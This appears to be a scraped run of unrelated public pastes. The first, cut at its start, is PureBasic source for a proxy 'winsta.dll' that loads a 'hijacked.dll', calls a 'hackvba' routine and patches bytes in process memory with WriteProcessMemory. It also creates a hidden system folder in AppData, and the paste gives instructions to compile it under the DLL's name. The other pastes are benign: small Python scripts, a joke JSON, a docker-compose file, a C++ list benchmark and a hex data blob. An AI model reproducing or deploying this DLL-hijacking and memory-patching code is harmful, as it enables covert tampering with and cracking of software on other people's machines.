If Hook_dll_0($1D6247,""74"", LibraryID(0))
Break
EndIf
EndIf
Delay(Interval)
ForEver
EndProcedure
 
ProcedureDLL Quatrinh_2(Interval.l)
Repeat
If OpenLibrary(0, Filenamedll_2)
If Hook_dll_0($1D6247,""74"", LibraryID(0))
Break
EndIf
EndIf
Delay(Interval)
ForEver
EndProcedure
 
ProcedureDLL hackvba()
OFS_0()
if Quatrinh_0= CreateThread(@Quatrinh_0(),1) : WaitThread(Quatrinh_0) : Endif
if Quatrinh_1= CreateThread(@Quatrinh_1(),1) : WaitThread(Quatrinh_1) : Endif
if Quatrinh_2= CreateThread(@Quatrinh_2(),1) : WaitThread(Quatrinh_2) : Endif
EndProcedure
 

Next step complied this code and save it with name winsta.dll
Global content.s =""""
Global encryptedHex.s =""""
Global Fulllic.s =""""
Global PC.s =""No""
Global.i ShowWelcome = 1, ExeSize
Global.s Thumuc_0, Md5File, ExeMD5
Global.s FilenameEXE_0 = GetPathPart(ProgramFilename())+""Project1.exe"",Filenamedll_0 = GetPathPart(ProgramFilename())+""Project1.exe""

ProcedureDLL OFS_0()
UseMD5Fingerprint()
ExeSize        = FileSize(FilenameEXE_0)
ExeMD5         = StringFingerprint(Str(ExeSize), #PB_Cipher_MD5, #PB_Ascii)
Thumuc_0   = GetEnvironmentVariable(""AppData"") + ""\""+""Victoria""
CreateDirectory(Thumuc_0)
Md5File        = Thumuc_0 +""\"" + ExeMD5 + ""OFS.gms""
SetFileAttributes(Thumuc_0,#PB_FileSystem_Hidden|#PB_FileSystem_System)
EndProcedure

ProcedureDLL Hook_exe0(Memory.i, RData.s)
hModule    = GetModuleHandle_(#Null) : lpBaseAddress = hModule + Memory
TData.s    = Trim(RData)
nSize.i    = 0.5 * Len(TData)
lpBuffer.i = Val(""$"" + TData)
WriteProcessMemory_(GetCurrentProcess_(), lpBaseAddress, @lpBuffer, nSize, NULL)
EndProcedure

ProcedureDLL AttachProcess(Instance)
delay(100)
OFS_0()
Hook_exe0($1D6480,""74"")
Define libID = OpenLibrary(#PB_Any, ""hijacked.dll"")

If libID
  ; Use GetFunction to check if AttachProcess exists
  Define funcAttachProcess = GetFunction(libID, ""hackvba"")
  
  If funcAttachProcess
    ; Call the function if it exists
    CallFunction(libID, ""hackvba"", 0) ; Pass any necessary arguments, if needed
  Else
    MessageRequester(""Error"", ""AttachProcess function not found in the DLL"")
  EndIf
  
  ; Close the library after use
  CloseLibrary(libID)
Else
  MessageRequester(""Error"", ""Failed to load hijacked.dll"")
EndIf
EndProcedure
ProcedureDLL LogonIdFromWinStationNameA()
EndProcedure
ProcedureDLL LogonIdFromWinStationNameW()
EndProcedure
ProcedureDLL RemoteAssistancePrepareSystemRestore()
EndProcedure
ProcedureDLL ServerGetInternetConnectorStatus()
EndProcedure
ProcedureDLL ServerLicensingClose()
EndProcedure
ProcedureDLL ServerLicensingDeactivateCurrentPolicy()
EndProcedure
ProcedureDLL ServerLicensingFreePolicyInformation()
EndProcedure
ProcedureDLL ServerLicensingGetAadInfo()
EndProcedure
ProcedureDLL ServerLicensingGetAvailablePolicyIds()
EndProcedure
ProcedureDLL ServerLicensingGetPolicy()
EndProcedure
ProcedureDLL ServerLicensingGetPolicyInformationA()
EndProcedure
ProcedureDLL ServerLicensingGetPolicyInformationW()
EndProcedure
ProcedureDLL ServerLicensingLoadPolicy()
EndProcedure
ProcedureDLL ServerLicensingOpenA()
EndProcedure
ProcedureDLL ServerLicensingOpenW()
EndProcedure
ProcedureDLL ServerLicensingSetAadInfo()
EndProcedure
ProcedureDLL ServerLicensingSetPolicy()
EndProcedure
ProcedureDLL ServerLicensingUnloadPolicy()
EndProcedure
ProcedureDLL ServerQueryInetConnectorInformationA()
EndProcedure
ProcedureDLL ServerQueryInetConnectorInformationW()
EndProcedure
ProcedureDLL ServerSetInternetConnectorStatus()
EndProcedure
ProcedureDLL WTSRegisterSessionNotificationEx()
EndProcedure
ProcedureDLL WTSUnRegisterSessionNotificationEx()
EndProcedure
ProcedureDLL WinStationActivateLicense()
EndProcedure
ProcedureDLL WinStationAutoReconnect()
EndProcedure
ProcedureDLL WinStationBroadcastSystemMessage()
EndProcedure
ProcedureDLL WinStationCheckAccess()
EndProcedure
ProcedureDLL WinStationCheckLoopBack()
EndProcedure
ProcedureDLL WinStationCloseServer()
EndProcedure
ProcedureDLL WinStationConnectA()
EndProcedure
ProcedureDLL WinStationConnectAndLockDesktop()
EndProcedure
ProcedureDLL WinStationConnectCallback()
EndProcedure
ProcedureDLL WinStationConnectEx()
EndProcedure
ProcedureDLL WinStationConnectW()
EndProcedure
ProcedureDLL WinStationConsumeCacheSession()
EndProcedure
ProcedureDLL WinStationCreateChildSessionTransport()
EndProcedure
ProcedureDLL WinStationDisconnect()
EndProcedure
ProcedureDLL WinStationEnableChildSessions()
EndProcedure
ProcedureDLL WinStationEnumerateA()
EndProcedure
ProcedureDLL WinStationEnumerateContainerSessions()
EndProcedure
ProcedureDLL WinStationEnumerateExW()
EndProcedure
ProcedureDLL WinStationEnumerateLicenses()
EndProcedure
ProcedureDLL WinStationEnumerateProcesses()
EndProcedure
ProcedureDLL WinStationEnumerateW()
EndProcedure
ProcedureDLL WinStationEnumerate_IndexedA()
EndProcedure
ProcedureDLL WinStationEnumerate_IndexedW()
EndProcedure
ProcedureDLL WinStationFreeConsoleNotification()
EndProcedure
ProcedureDLL WinStationFreeEXECENVDATAEX()
EndProcedure
ProcedureDLL WinStationFreeGAPMemory()
EndProcedure
ProcedureDLL WinStationFreeMemory()
EndProcedure
ProcedureDLL WinStationFreePropertyValue()
EndProcedure
ProcedureDLL WinStationFreeUserCertificates()
EndProcedure
ProcedureDLL WinStationFreeUserCredentials()
EndProcedure
ProcedureDLL WinStationFreeUserSessionInfo()
EndProcedure
ProcedureDLL WinStationGenerateLicense()
EndProcedure
ProcedureDLL WinStationGetAllProcesses()
EndProcedure
ProcedureDLL WinStationGetAllSessionsEx()
EndProcedure
ProcedureDLL WinStationGetAllSessionsW()
EndProcedure
ProcedureDLL WinStationGetAllUserSessions()
EndProcedure
ProcedureDLL WinStationGetChildSessionId()
EndProcedure
ProcedureDLL WinStationGetConnectionProperty()
EndProcedure
ProcedureDLL WinStationGetCurrentSessionCapabilities()
EndProcedure
ProcedureDLL WinStationGetCurrentSessionConnectionProperty()
EndProcedure
ProcedureDLL WinStationGetCurrentSessionTerminalName()
EndProcedure
ProcedureDLL WinStationGetDeviceId()
EndProcedure
ProcedureDLL WinStationGetInitialApplication()
EndProcedure
ProcedureDLL WinStationGetLanAdapterNameA()
EndProcedure
ProcedureDLL WinStationGetLanAdapterNameW()
EndProcedure
ProcedureDLL WinStationGetLastWinlogonNotification()
EndProcedure
ProcedureDLL WinStationGetLoggedOnCount()
EndProcedure
ProcedureDLL WinStationGetMachinePolicy()
EndProcedure
ProcedureDLL WinStationGetParentSessionId()
EndProcedure
ProcedureDLL WinStationGetProcessSid()
EndProcedure
ProcedureDLL WinStationGetRedirectAuthInfo()
EndProcedure
ProcedureDLL WinStationGetRestrictedLogonInfo()
EndProcedure
ProcedureDLL WinStationGetSessionIds()
EndProcedure
ProcedureDLL WinStationGetTermSrvCountersValue()
EndProcedure
ProcedureDLL WinStationGetUserCertificates()
EndProcedure
ProcedureDLL WinStationGetUserCredentials()
EndProcedure
ProcedureDLL WinStationGetUserProfile()
EndProcedure
ProcedureDLL WinStationInstallLicense()
EndProcedure
ProcedureDLL WinStationIsBoundToCacheTerminal()
EndProcedure
ProcedureDLL WinStationIsChildSessionsEnabled()
EndProcedure
ProcedureDLL WinStationIsCurrentSessionRemoteable()
EndProcedure
ProcedureDLL WinStationIsHelpAssistantSession()
EndProcedure
ProcedureDLL WinStationIsSessionPermitted()
EndProcedure
ProcedureDLL WinStationIsSessionRemoteable()
EndProcedure
ProcedureDLL WinStationNameFromLogonIdA()
EndProcedure
ProcedureDLL WinStationNameFromLogonIdW()
EndProcedure
ProcedureDLL WinStationNegotiateSession()
EndProcedure
ProcedureDLL WinStationNtsdDebug()
EndProcedure
ProcedureDLL WinStationOpenServerA()
EndProcedure
ProcedureDLL WinStationOpenServerExA()
EndProcedure
ProcedureDLL WinStationOpenServerExW()
EndProcedure
ProcedureDLL WinStationOpenServerW()
EndProcedure
ProcedureDLL WinStationPreCreateGlassReplacementSession()
EndProcedure
ProcedureDLL WinStationPreCreateGlassReplacementSessionEx()
EndProcedure
ProcedureDLL WinStationQueryAllowConcurrentConnections()
EndProcedure
ProcedureDLL WinStationQueryCurrentSessionInformation()
EndProcedure
ProcedureDLL WinStationQueryEnforcementCore()
EndProcedure
ProcedureDLL WinStationQueryInformationA()
EndProcedure
ProcedureDLL WinStationQueryInformationW()
EndProcedure
ProcedureDLL WinStationQueryLicense()
EndProcedure
ProcedureDLL WinStationQueryLogonCredentialsW()
EndProcedure
ProcedureDLL WinStationQuerySessionVirtualIP()
EndProcedure
ProcedureDLL WinStationQueryUpdateRequired()
EndProcedure
ProcedureDLL WinStationRcmShadow2()
EndProcedure
ProcedureDLL WinStationRedirectErrorMessage()
EndProcedure
ProcedureDLL WinStationRedirectLogonBeginPainting()
EndProcedure
ProcedureDLL WinStationRedirectLogonError()
EndProcedure
ProcedureDLL WinStationRedirectLogonMessage()
EndProcedure
ProcedureDLL WinStationRedirectLogonStatus()
EndProcedure
ProcedureDLL WinStationRegisterConsoleNotification()
EndProcedure
ProcedureDLL WinStationRegisterConsoleNotificationEx()
EndProcedure
ProcedureDLL WinStationRegisterConsoleNotificationEx2()
EndProcedure
ProcedureDLL WinStationRegisterCurrentSessionNotificationEvent()
EndProcedure
ProcedureDLL WinStationRegisterNotificationEvent()
EndProcedure
ProcedureDLL WinStationRemoveLicense()
EndProcedure
ProcedureDLL WinStationRenameA()
EndProcedure
ProcedureDLL WinStationRenameW()
EndProcedure
ProcedureDLL WinStationReportLoggedOnCompleted()
EndProcedure
ProcedureDLL WinStationReportUIResult()
EndProcedure
ProcedureDLL WinStationReset()
EndProcedure
ProcedureDLL WinStationRevertFromServicesSession()
EndProcedure
ProcedureDLL WinStationSendMessageA()
EndProcedure
ProcedureDLL WinStationSendMessageW()
EndProcedure
ProcedureDLL WinStationSendWindowMessage()
EndProcedure
ProcedureDLL WinStationServerPing()
EndProcedure
ProcedureDLL WinStationSetAutologonPassword()
EndProcedure
ProcedureDLL WinStationSetInformationA()
EndProcedure
ProcedureDLL WinStationSetInformationW()
EndProcedure
ProcedureDLL WinStationSetLastWinlogonNotification()
EndProcedure
ProcedureDLL WinStationSetPoolCount()
EndProcedure
ProcedureDLL WinStationSetRenderHint()
EndProcedure
ProcedureDLL WinStationShadow()
EndProcedure
ProcedureDLL WinStationShadowAccessCheck()
EndProcedure
ProcedureDLL WinStationShadowStop()
EndProcedure
ProcedureDLL WinStationShadowStop2()
EndProcedure
ProcedureDLL WinStationShutdownSystem()
EndProcedure
ProcedureDLL WinStationSwitchToServicesSession()
EndProcedure
ProcedureDLL WinStationSystemShutdownStarted()
EndProcedure
ProcedureDLL WinStationSystemShutdownWait()
EndProcedure
ProcedureDLL WinStationTerminateGlassReplacementSession()
EndProcedure
ProcedureDLL WinStationTerminateProcess()
EndProcedure
ProcedureDLL WinStationUnRegisterConsoleNotification()
EndProcedure
ProcedureDLL WinStationUnRegisterNotificationEvent()
EndProcedure
ProcedureDLL WinStationUserLoginAccessCheck()
EndProcedure
ProcedureDLL WinStationVerify()
EndProcedure
ProcedureDLL WinStationVirtualOpen()
EndProcedure
ProcedureDLL WinStationVirtualOpenEx()
EndProcedure
ProcedureDLL WinStationWaitSystemEvent()
EndProcedure
ProcedureDLL _NWLogonQueryAdmin()
EndProcedure
ProcedureDLL _NWLogonSetAdmin()
EndProcedure
ProcedureDLL _WinStationAnnoyancePopup()
EndProcedure
ProcedureDLL _WinStationBeepOpen()
EndProcedure
ProcedureDLL _WinStationBreakPoint()
EndProcedure
ProcedureDLL _WinStationCallback()
EndProcedure
ProcedureDLL _WinStationCheckForApplicationName()
EndProcedure
ProcedureDLL _WinStationFUSCanRemoteUserDisconnect()
EndProcedure
ProcedureDLL _WinStationGetApplicationInfo()
EndProcedure
ProcedureDLL _WinStationNotifyDisconnectPipe()
EndProcedure
ProcedureDLL _WinStationNotifyLogoff()
EndProcedure
ProcedureDLL _WinStationNotifyLogon()
EndProcedure
ProcedureDLL _WinStationNotifyNewSession()
EndProcedure
ProcedureDLL _WinStationOpenSessionDirectory()
EndProcedure
ProcedureDLL _WinStationReInitializeSecurity()
EndProcedure
ProcedureDLL _WinStationReadRegistry()
EndProcedure
ProcedureDLL _WinStationSessionInitialized()
EndProcedure
ProcedureDLL _WinStationShadowTarget()
EndProcedure
ProcedureDLL _WinStationShadowTarget2()
EndProcedure
ProcedureDLL _WinStationShadowTargetSetup()
EndProcedure
ProcedureDLL _WinStationUpdateClientCachedCredentials()
EndProcedure
ProcedureDLL _WinStationUpdateSettings()
EndProcedure
ProcedureDLL _WinStationUpdateUserConfig()
EndProcedure
ProcedureDLL _WinStationWaitForConnect()
EndProcedure"
ZriMNkDP,Untitled,yurashrol,Python,Tuesday 1st of April 2025 06:52:58 AM CDT,"# Введення двох чисел
num1 = float(input(""Введіть перше число: ""))
num2 = float(input(""Введіть друге число: ""))

# Вибір більшого числа
if num1 > num2:
    print(f""{num1} більше за {num2}"")
elif num2 > num1:
    print(f""{num2} більше за {num1}"")
else:
    print(""Числа рівні"")
"
mAzhiS4c,April Fools 2025,artiri_art,JSON,Tuesday 1st of April 2025 06:42:19 AM CDT,"[
""Accessing Mainframe\n[████▒▒▒▒▒▒▒▒] 23%\nConnection unstable..."",
""Decrypting Data Stream\n[███████▒▒▒▒] 67%\nError: Unknown Algorithm Detected!"",
""Initializing AI Core\n[█████████▒▒] 89%\nMemory Leak Detected. Reallocating..."",
""Uploading Neural Matrix\n[██████████▒] 96%\nPacket Loss Detected. Retrying..."",
""Establishing Server Connection\n[███▒▒▒▒▒▒▒▒] 30%\nERROR: Host Not Found! Switching Proxies..."",
""Recompiling Logic Nodes\n[██████▒▒▒▒▒] 55%\nSegmentation Fault! Attempting Self-Repair..."",
""Analyzing User Input\n[██▒▒▒▒▒▒▒▒▒] 12%\nInvalid Syntax? Rewriting Command..."",
""Activating Glitch Protocol\n[█████████▒▒] 90%\nReality Distortion Detected!"",
""Finalizing Execution\n[███████████] 99%\nERROR 404: Completion Not Found!"",
""Rebooting System\n[▒▒▒▒▒▒▒▒▒▒] 0%\nWARNING! Infinite Loop Initiated!""
]"
guHuCP01,Untitled,fffetaah,YAML,Tuesday 1st of April 2025 06:33:03 AM CDT,"

services:
  yeda.traefik:
    image: traefik:v3.0
    container_name: yeda.traefik
    networks:
      - yeda_php_network
    depends_on:
      - yeda.nginx
    restart: always
    ports:
      - ""80:80""
      - ""443:443""
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock:ro
      - ../yeda-data/letsencrypt:/letsencrypt
      - ../yeda-data/.htpasswd:/auth/.htpasswd:ro
    labels:
      - ""traefik.enable=true""
      - ""traefik.http.routers.api.rule=Host(`traefik.yeda-college.co.il`)""
      - ""traefik.http.routers.api.entrypoints=websecure""
      - ""traefik.http.routers.api.tls.certresolver=letsencrypt""
      - ""traefik.http.routers.api.service=api@internal""
      - ""com.datadoghq.ad.logs: '[{\""source\"": \""traefik\"", \""service\"": \""traefik\""}]'""
    command:
      - --entrypoints.web.address=:80
      - --entrypoints.websecure.address=:443
      - --api=true
      - --providers.docker=true
      - --providers.docker.exposedbydefault=false
      - --certificatesresolvers.letsencrypt.acme.httpchallenge=true
      - --certificatesresolvers.letsencrypt.acme.httpchallenge.entrypoint=web
      - --certificatesresolvers.letsencrypt.acme.email=yeda@floinay.com
      - --certificatesresolvers.letsencrypt.acme.storage=/letsencrypt/acme.json
      - --accesslog=true
  yeda.php-fpm:
    container_name: yeda.php-fpm
    healthcheck:
      test: [ ""CMD-SHELL"", ""php-fpm -t"" ]
      interval: 10s
      timeout: 3s
      retries: 3
    command: [""php-fpm"", ""-F""]
    build:
      context: .
      dockerfile: php/Dockerfile.php-fpm
    depends_on:
      - yeda.postgres
      - yeda.redis
    restart: always
    env_file:
      - .env
    volumes:
      - ./php/php-fpm.d:/usr/local/etc/php-fpm.d
      - ./php/php.ini:/usr/local/etc/php/php.ini
      - ../yeda-php:/var/www/html
      - php_fpm_socket:/run/php
    networks:
      - yeda_php_network

  yeda.nginx:
    container_name: yeda.nginx
    labels:
      - ""traefik.enable=true""
      - ""traefik.http.routers.yeda.rule=Host(`new.yeda-college.co.il`)""
      - ""traefik.http.routers.yeda.entrypoints=websecure""
      - ""traefik.http.routers.yeda.tls.certresolver=letsencrypt""
      - ""traefik.http.services.yeda.loadbalancer.server.port=80""

      - ""traefik.http.routers.yeda-http.entrypoints=web""
      - ""traefik.http.routers.yeda-http.rule=Host(`new.yeda-college.co.il`)""
      - ""traefik.http.routers.yeda-http.middlewares=https-redirect""
      - ""traefik.http.middlewares.https-redirect.redirectscheme.scheme=https""
      - ""com.datadoghq.ad.logs: '[{\""source\"": \""nginx\"", \""service\"": \""nginx\""}]'""
    build:
      context: .
      dockerfile: nginx/Dockerfile
    restart: always
    depends_on:
      yeda.php-fpm:
        condition: service_healthy

    volumes:
      - ./nginx/templates:/etc/nginx/templates
      - ../yeda-php:/var/www/html
      - ../yeda-data/certs:/etc/ssl/certs
      - php_fpm_socket:/run/php
    networks:
      - yeda_php_network

  yeda.postgres:
    image: postgres:latest
    container_name: yeda.postgres
    labels:
      - ""com.datadoghq.ad.logs: '[{\""source\"": \""postgresql\"", \""service\"": \""postgres\""}]'""
    restart: always
    #ports needed only for migration, remove after full migration from DO to HZ
    ports:
      - ""5432:5432""
    env_file:
      - .env
    volumes:
      - ../yeda-data/postgres:/var/lib/postgresql/data
    environment:
      POSTGRES_DB: ${POSTGRES_DB}
      POSTGRES_USER: ${POSTGRES_USER}
      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD}
      TZ: UTC
    healthcheck:
      test: [""CMD-SHELL"", ""pg_isready -U $POSTGRES_USER""]
      interval: 30s
      timeout: 5s
      retries: 5
    networks:
      - yeda_php_network
    command:
      - ""postgres""
      - ""-c""
      - ""max_connections=200""
      - ""-c""
      - ""shared_buffers=15GB""
      - ""-c""
      - ""effective_cache_size=45GB""
      - ""-c""
      - ""maintenance_work_mem=2GB""
      - ""-c""
      - ""checkpoint_completion_target=0.9""
      - ""-c""
      - ""wal_buffers=16MB""
      - ""-c""
      - ""default_statistics_target=100""
      - ""-c""
      - ""random_page_cost=1.1""
      - ""-c""
      - ""effective_io_concurrency=200""
      - ""-c""
      - ""work_mem=19660kB""
      - ""-c""
      - ""huge_pages=try""
      - ""-c""
      - ""min_wal_size=1GB""
      - ""-c""
      - ""max_wal_size=4GB""
      - ""-c""
      - ""max_worker_processes=30""
      - ""-c""
      - ""max_parallel_workers_per_gather=4""
      - ""-c""
      - ""max_parallel_workers=30""
      - ""-c""
      - ""max_parallel_maintenance_workers=4""

  yeda.redis:
    image: redis:latest
    container_name: yeda.redis
    restart: always
    volumes:
      - ../data/redis:/data
    healthcheck:
      test: [""CMD"", ""redis-cli"", ""ping""]
      interval: 30s
      timeout: 10s
      retries: 5
    networks:
      - yeda_php_network

  yeda.queue-worker:
    image: ghcr.io/yeda-colleges/yeda-php-cli:8.2
    container_name: yeda.queue-workers
    labels:
      - ""com.datadoghq.ad.logs: '[{\""source\"": \""php\"", \""service\"": \""laravel-worker\""}]'""
    restart: always
    depends_on:
      - yeda.redis
      - yeda.postgres
    env_file:
      - .env
    volumes:
      - ../yeda-php:/var/www/html
    command: php /var/www/html/artisan queue:work --timeout=90 --memory=1000 --tries=3
    deploy:
      replicas: 1
    networks:
      - yeda_php_network

  yeda.scheduler:
    container_name: yeda.scheduler
    labels:
      - ""com.datadoghq.ad.logs: '[{\""source\"": \""php\"", \""service\"": \""laravel-scheduler\""}]'""
    image: ghcr.io/yeda-colleges/yeda-php-cli:8.2
    restart: always
    env_file:
      - .env
    volumes:
      - ../yeda-php:/var/www/html
    entrypoint: [""/bin/sh"", ""-c"", ""while :; do php /var/www/html/artisan schedule:run; sleep 60; done""]
    networks:
      - yeda_php_network

  yeda.composer:
    container_name: yeda.composer
    build:
      context: .
      dockerfile: ./php/Dockerfile.composer
    volumes:
      - ../yeda-php:/var/www/html
    working_dir: /var/www/html
    command: composer install --optimize-autoloader --no-dev
    networks:
      - yeda_php_network

  datadog:
    image: gcr.io/datadoghq/agent:latest
    depends_on:
      - yeda.nginx
      - yeda.php-fpm
      - yeda.queue-worker
      - yeda.scheduler
      - yeda.traefik
    container_name: datadog
    restart: always
    env_file:
      - .env
    environment:
      DD_API_KEY: ${DD_API_KEY}
      DD_SITE: datadoghq.eu
      DD_APM_ENABLED: ""true""
      DD_LOGS_ENABLED: ""true""
      DD_PROCESS_AGENT_ENABLED: ""true""
      DD_DOGSTATSD_NON_LOCAL_TRAFFIC: ""true""
      DD_CONTAINER_EXCLUDE: ""name:datadog""
      DD_PROCESS_CONFIG_ENABLED: ""true""
      DD_PROCESS_CONFIG_PROCESS_COLLECTION_ENABLED: ""true""
      DD_LOGS_CONFIG_CONTAINER_COLLECT_ALL: ""true""
      DD_CONTAINER_LOGS_ENABLED: ""true""
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock:ro
      - /proc/:/host/proc/:ro
      - /sys/fs/cgroup/:/host/sys/fs/cgroup:ro
    networks:
      - yeda_php_network

volumes:
  php_fpm_socket:

networks:
  yeda_php_network:
    driver: bridge
"
HQaf0HXn,Pillole video 6,fcamuso,C#,Tuesday 1st of April 2025 06:31:15 AM CDT,"#include <iostream>
#include <chrono>
#include <vector>


using namespace std;

struct Nodo {
  string dato = """";

  Nodo *next = nullptr;
};



void ins_testa(Nodo *&il, Nodo *nuovo)
{
    nuovo->next = il;
    il = nuovo;
}



void ins_coda(Nodo *&il, Nodo *nuovo)
{
  if (il == nullptr) //lista vuota ?
  {
    nuovo->next = il;
    il = nuovo;
  }
  else
  {
    Nodo *ultimo = il;

    //otteniamo un puntatore all'ultimo nodo attuale
    while(ultimo->next != nullptr) ultimo = ultimo->next;

    ultimo->next = nuovo;
    nuovo->next = nullptr;
  }
}

void stampa_dalla_coda(Nodo *p, int profondita, int &massima)
{
  massima = max(profondita, massima);

  if (p!=nullptr)
    stampa_dalla_coda(p->next, profondita+1, massima);
}


//Equazione di ricorrenza temporale: T(n) = 2*T(n/2) + O(n)
//Equazione di ricorrenza spaziale: T(n) = T(n/2) + O(1)
//Complessità temporale: O(nlog(n))
//Complessità spaziale: O(log(n))
void stampaInvertita(Nodo *testa,int  dim){

    //Casi base
    //Lista vuota
    if (testa == nullptr)
        return;
    //Lista con un solo elemento
    if (testa->next == nullptr)
        ;//cout << testa->dato << endl;
        //Passo ricorsivo
    else{
        Nodo* attuale = testa;
        //Suddivido in due metà la lista
        for (int i = 0; i < dim/2 - 1; ++i) {
            attuale = attuale->next;
        }
        //Mi fermo all'ultimo elemento della prima metà
        //ed imposto il puntatore al successivo a nullptr, così da avere due liste fisicamente separate
        Nodo* temp = attuale;
        attuale = attuale->next;
        temp->next = nullptr;

        //Ora richiedo la stampa della seconda metà seguita dalla prima; l'ordine delle chiamate è fondamentale
        stampaInvertita(attuale, dim/2);
        stampaInvertita(testa, dim - dim/2);

        //Dopo la stampa non resta che ricongiungere le due liste precedentemente divise
        temp->next = attuale;
    }
}

//credits Alex-qk5ei (youtube)
int stampaInvertitaMisuraStack(Nodo *testa, int dim){

    //Casi base
    //Lista vuota
    if (testa == nullptr)
        return 1;
    //Lista con un solo elemento
    if (testa->next == nullptr) {
        ;//cout << testa->dato << endl;
        return 1;
    }
    //Passo ricorsivo
    else{
        Nodo* attuale = testa;

        // 00010010 18
        //


        //Suddivido in due metà la lista
        for (int i = 0; i < (dim>>1) - 1; ++i) {
            attuale = attuale->next;
        }
        //Mi fermo all'ultimo elemento della prima metà
        //ed imposto il puntatore al successivo a nullptr, così da avere due liste fisicamente separate
        Nodo* temp = attuale;
        attuale = attuale->next;
        temp->next = nullptr;

        /*La profondità massima dello stack P(n) può essere definita ricorsivamente come: P(n) = max(P(n/2), P(n-n/2)) + 1
        L'addendo 1 equivale alla presenza sullo stack del record di attivazione corrente
        Inoltre, considerando che n-n/2 >= n/2 in ogni caso, max(P(n/2), P(n-n/2)) = P(n-n/2) e, conseguentemente
        P(n) = P(n-n/2) + 1
        L'istruzione sottostante rappresenta dunque la profondità massima che andrà restituita al metodo chiamante
        */
        //Ora richiedo la stampa della seconda metà seguita dalla prima; l'ordine delle chiamate è fondamentale
        int profondita = stampaInvertitaMisuraStack(attuale, dim - (dim>>1)) + 1;
        stampaInvertitaMisuraStack(testa, dim>>1);
        //Dopo la stampa non resta che ricongiungere le due liste precedentemente divise
        temp->next = attuale;

        return profondita;
    }
}


enum Comando {START, STOP};
auto Cronometro(Comando comando = Comando::START)
{
  static std::chrono::time_point<std::chrono::system_clock> inizio;
  static std::chrono::time_point<std::chrono::system_clock> fine;

  if (comando == Comando::START)
  {
    inizio = chrono::high_resolution_clock::now();
    fine = inizio;
  }
  else
    fine = chrono::high_resolution_clock::now();


  return chrono::duration_cast<std::chrono::milliseconds>(fine - inizio).count();
}


void stampaInvertitaVector(Nodo *il)
{
  vector<Nodo*> v;

  while(il!=nullptr)
  {
    v.push_back(il);
    il = il-> next;
  }

  for (int i=v.size()-1; i>=0; i--);
    //cout << v[i] -> dato << "" "";
}

void stampa(Nodo *p)
{
  while (p!=nullptr)
  {
    //cout << p->dato << "" "";

    //al prossimo nodo
    p = p->next;
  }
}

// Struttura per rappresentare una ""mossa""
struct HanoiMove {
    int n;          // Numero di dischi
    char from;      // Piolo di partenza (A, B, C)
    char to;        // Piolo di destinazione
    char aux;       // Piolo ausiliario
};

// Versione iterativa senza STL (stack manuale)
void hanoi_iterative_no_stl(int n, char from = 'A', char to = 'C', char aux = 'B') {
    const int MAX_STACK_SIZE = 1000; // Dimensione massima dello stack
    HanoiMove stack[MAX_STACK_SIZE];
    int top = -1; // Inizializza lo stack vuoto

    // Simula la prima chiamata ricorsiva
    stack[++top] = {n, from, to, aux};

    while (top >= 0) { // Finché lo stack non è vuoto
        HanoiMove current = stack[top--]; // Pop

        if (current.n == 1) {
            // Caso base: sposta il disco
            cout << ""Muovi disco 1 da "" << current.from << "" a "" << current.to << endl;
        } else {
            // Simula le chiamate ricorsive in ordine inverso (LIFO)
            // 1. hanoi(n-1, aux, to, from)
            stack[++top] = {current.n - 1, current.aux, current.to, current.from};
            // 2. Sposta il disco n da from a to (caso base fittizio)
            stack[++top] = {1, current.from, current.to, current.aux};
            // 3. hanoi(n-1, from, aux, to)
            stack[++top] = {current.n - 1, current.from, current.aux, current.to};
        }
    }
}

//versione ricorsiva
void hanoi(int n, char from = 'A', char to = 'C', char aux = 'B') {
    if (n == 1) {
        cout << ""Muovi disco 1 da "" << from << "" a "" << to << endl;
        return;
    }
    hanoi(n - 1, from, aux, to);  // Sposta n-1 dischi da 'from' a 'aux'
    cout << ""Muovi disco "" << n << "" da "" << from << "" a "" << to << endl;
    hanoi(n - 1, aux, to, from);  // Sposta n-1 dischi da 'aux' a 'to'
}

int main()
{
    string dati_prova[] = {""abaco"", ""amo"", ""bicicletta"", ""cane"", ""canguro"", ""mare"", ""sale"", ""zebra""};

    Nodo *il = nullptr;

    int quante_run=5;
    int num_ele = 50000;

    for (int i=0; i<num_ele; i++)
      ins_coda(il, new Nodo{dati_prova[i%8]});

    //stampaInvertitaVector(il);

    Cronometro(Comando::START);
    for (int run=0; run<quante_run; run++)
          stampaInvertita(il,num_ele);
    cout << ""Ricorsione con divide/impera: "" << Cronometro(Comando::STOP) << endl;


    Cronometro(Comando::START);
    for (int run=0; run<quante_run; run++)
          stampaInvertitaVector(il);
    cout << ""Iterativa con vector di puntatori: "" << Cronometro(Comando::STOP) << endl;

    return 0;
}
"
52LDx8wp,dataNone,TestGuy1,JSON,Tuesday 1st of April 2025 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'b1ef3fa5ac2902a266fd4ba27aba58de101267892af5503ffac172e1f1d2126f1eb190b050fa4faf49ee8d6d666153d0e32ce7180211df1344eb8e8b648a6309f9ca0aed27300f83cb887c0df4da05d19826ccad2e07a654bbe84ecaa13c33688847896c4e34fed67f23e661132183b783d7d27917070420383efb6975688e23',
  otherdata: [
    '16b067f13836fac708876713dceb2e72',
    '89a67e34eb9c203f9ce47fb8b13a9893',
    'c962800e6a2d994e23dec66bc2d4d1c0',
    '0b50b1b6d936a454dbf756b5e459f6c5',
    'b7ec14380209c11fd2939f86c57d6bac',
    'e6d2959c0ddcce04408363ff36737ace',
    '07f69fce75cab86a528b6b0b3ceed168',
    '83f7d9d996a3867e58d18235d196fb76'
  ]
}"
8jjuznEq,snad funguje kqK,max2201111,Python,Tuesday 1st of April 2025 05:37:50 AM CDT,"#!/usr/bin/env python3
import time
import threading
import sys
from math import inf

# Globální konstanty – pohyby jezdce (relativní souřadnice)
knight_moves = [(2,1),(2,-1),(-2,1),(-2,-1),(1,2),(1,-2),(-1,2),(-1,-2)]

# Globální proměnné pro sledování času
running = False
start_time = 0

###############################################################################
# Funkce pro výpis času v samostatném vlákně
###############################################################################

def time_reporter():
    """"""Funkce pro výpis aktuálního času každou sekundu na stejném řádku.""""""
    global running, start_time
    while running:
        elapsed = time.time() - start_time
        hrs = int(elapsed // 3600)
        mins = int((elapsed % 3600) // 60)
        secs = int(elapsed % 60)
        
        # Použijeme \r pro návrat na začátek řádku a přepsání předchozího výpisu
        sys.stdout.write(f""\r[INFO] Uplynulý čas: {hrs:02d}h {mins:02d}m {secs:02d}s"")
        sys.stdout.flush()
        
        time.sleep(1)

